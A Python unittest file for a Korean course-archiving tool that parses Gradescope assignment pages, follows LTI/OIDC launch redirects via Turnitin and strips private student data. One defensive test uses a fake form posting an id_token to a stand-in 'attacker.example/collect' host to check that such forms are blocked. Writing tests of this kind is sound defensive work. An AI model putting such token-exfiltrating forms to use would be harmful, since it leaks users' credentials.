import html
import json
import tempfile
import unittest
from types import SimpleNamespace
from unittest.mock import patch

from yonstudy.archive import Archiver
from yonstudy.export import render_assignment_markdown
from yonstudy.lti import (
    LtiAssignment,
    LtiArchiveError,
    _launch_page,
    parse_gradescope_assignment,
)
from yonstudy.store import Store


def gradescope_page(props: dict) -> str:
    encoded = html.escape(json.dumps(props, ensure_ascii=False), quote=True)
    return (
        '<div data-react-class="OnlineAssignmentSubmitter" '
        f'data-react-props="{encoded}"></div>'
    )


class GradescopeAssignmentTests(unittest.TestCase):
    def test_public_question_spec_is_rendered_without_private_props(self):
        page = gradescope_page(
            {
                "title": "1. Recursion Coding Assignment",
                "ownerId": 999,
                "answers": {"secret": "student answer"},
                "roster": [{"email": "student@example.test"}],
                "submitAssignmentURL": "/secret/csrf-token",
                "outline": [
                    {
                        "title": "Fibonacci Number (509)",
                        "weight": 5.0,
                        "content": [
                            {
                                "type": "text",
                                "value": (
                                    "Solve https://leetcode.com/problems/"
                                    "fibonacci-number/ and submit a screenshot."
                                ),
                            },
                            {"type": "file_upload_input"},
                            {"type": "free_response_input"},
                        ],
                    },
                    {
                        "title": "Yonsei-OJ assignment",
                        "weight": 75,
                        "contents": [{"type": "text", "text": "Do not forget."}],
                    },
                ],
            }
        )

        assignment = parse_gradescope_assignment(
            page,
            "https://www.gradescope.com/courses/1/assignments/2/submissions/new",
        )

        self.assertEqual(assignment.provider, "Gradescope")
        self.assertEqual(assignment.question_count, 2)
        self.assertEqual(assignment.total_points, "80")
        self.assertIn("## 문항 1. Fibonacci Number (509) — 5점", assignment.instructions)
        self.assertIn("제출 항목: 파일 업로드", assignment.instructions)
        self.assertIn("제출 항목: 서술형 응답", assignment.instructions)
        self.assertNotIn("student answer", assignment.instructions)
        self.assertNotIn("student@example.test", assignment.instructions)
        self.assertNotIn("csrf-token", assignment.instructions_html)

        rendered = render_assignment_markdown(
            {"title": "자료구조"},
            {
                "cmid": 4545002,
                "title": assignment.title,
                "modname": "lti",
                "fields_json": json.dumps(
                    {"Provider": assignment.provider, "Maximum marks": "80"}
                ),
                "instructions": assignment.instructions,
            },
        ).decode("utf-8")
        self.assertIn("- 제공자: Gradescope", rendered)
        self.assertIn("- 총점: 80점", rendered)

    def test_missing_online_assignment_props_is_rejected(self):
        with self.assertRaisesRegex(LtiArchiveError, "명세"):
            parse_gradescope_assignment("<html></html>", "https://www.gradescope.com/")


class LtiLaunchTests(unittest.TestCase):
    class FakeClient:
        def __init__(self, final_page: str):
            self.final_page = final_page
            self.calls = []

        def fetch(self, url, referer):
            self.calls.append(("GET", url, referer, None))
            if "learnus.org/mod/lti/launch.php" in url:
                return (
                    '<form method="post" action="https://lti.int.turnitin.com/oidc/login">'
                    '<input type="hidden" name="login_hint" value="opaque">'
                    "</form>",
                    url,
                )
            return (
                '<form method="post" action="https://www.gradescope.com/lti/callback">'
                '<input type="hidden" name="id_token" value="opaque-token">'
                "</form>",
                url,
            )

        def submit(self, url, fields, referer):
            self.calls.append(("POST", url, referer, fields))
            if "turnitin.com" in url:
                return (
                    'let redirect_url = new URL("https://www.gradescope.com/lti/login");',
                    "https://lti.int.turnitin.com/launch",
                )
            return (
                self.final_page,
                "https://www.gradescope.com/courses/1/assignments/2/submissions/new",
            )

    def test_oidc_forms_and_safe_javascript_redirect_are_followed(self):
        client = self.FakeClient(gradescope_page({"title": "과제", "outline": []}))

        page, final = _launch_page(client, 4545002)

        self.assertIn("OnlineAssignmentSubmitter", page)
        self.assertTrue(final.endswith("/submissions/new"))
        self.assertEqual([call[0] for call in client.calls], ["GET", "POST", "GET", "POST"])

    def test_debug_form_is_ignored_when_oidc_redirect_form_is_present(self):
        class TurnitinClient(self.FakeClient):
            def submit(self, url, fields, referer):
                self.calls.append(("POST", url, referer, fields))
                if url.endswith("/oidc/login"):
                    return (
                        '<form method="post" action="/lti/oidc-redirect">'
                        '<input type="hidden" name="state" value="opaque-state">'
                        '<input type="hidden" name="url" value="opaque-url"></form>'
                        '<form method="post">'
                        '<input type="hidden" name="debug" value="1">'
                        '<input type="hidden" name="login_hint" value="opaque"></form>',
                        url,
                    )
                if url.endswith("/lti/oidc-redirect"):
                    return (
                        'let redirect_url = new URL("https://www.gradescope.com/lti/login");',
                        url,
                    )
                return (
                    self.final_page,
                    "https://www.gradescope.com/courses/1/assignments/2/submissions/new",
                )

        client = TurnitinClient(gradescope_page({"title": "과제", "outline": []}))

        _launch_page(client, 4545002)

        posts = [call for call in client.calls if call[0] == "POST"]
        self.assertEqual(posts[1][1], "https://lti.int.turnitin.com/lti/oidc-redirect")
        self.assertNotIn("debug", posts[1][3])

    def test_form_post_to_unknown_host_is_blocked(self):
        class UnsafeClient:
            def fetch(self, url, referer):
                return (
                    '<form method="post" action="https://attacker.example/collect">'
                    '<input name="id_token" value="secret"></form>',
                    url,
                )

            def submit(self, *_args, **_kwargs):
                raise AssertionError("unsafe form must not be submitted")

        with self.assertRaisesRegex(LtiArchiveError, "차단"):
            _launch_page(UnsafeClient(), 4545002)


class LtiArchiveIntegrationTests(unittest.TestCase):
    def test_lti_spec_is_saved_as_generic_assignment_without_private_payload(self):
        assignment = LtiAssignment(
            provider="Gradescope",
            title="외부 제목",
            source_url="https://www.gradescope.com/courses/1/assignments/2/submissions/new",
            instructions="## 문항 1. Fibonacci — 5점\n\n문제 설명",
            instructions_html="<h2>문항 1. Fibonacci — 5점</h2><p>문제 설명</p>",
            question_count=1,
            total_points="5",
        )
        with tempfile.TemporaryDirectory() as root:
            store = Store(root)
            archiver = Archiver(object(), store, verbose=False)
            course = SimpleNamespace(course_id=297395)
            activity = SimpleNamespace(cmid=4545002, title="1. Recursion Coding Assignment")

            with patch("yonstudy.archive.fetch_lti_assignment", return_value=assignment):
                archiver._sync_lti_assignment(course, activity)
            store.commit()

            row = dict(store.query("SELECT * FROM submission WHERE cmid=4545002")[0])
            fields = json.loads(row["fields_json"])
            self.assertEqual(row["modname"], "lti")
            self.assertIsNone(row["submitted"])
            self.assertIn("Fibonacci", row["instructions"])
            self.assertEqual(fields["Provider"], "Gradescope")
            self.assertEqual(fields["Maximum marks"], "5")
            self.assertNotIn("source_url", row["fields_json"])


if __name__ == "__main__":
    unittest.main()
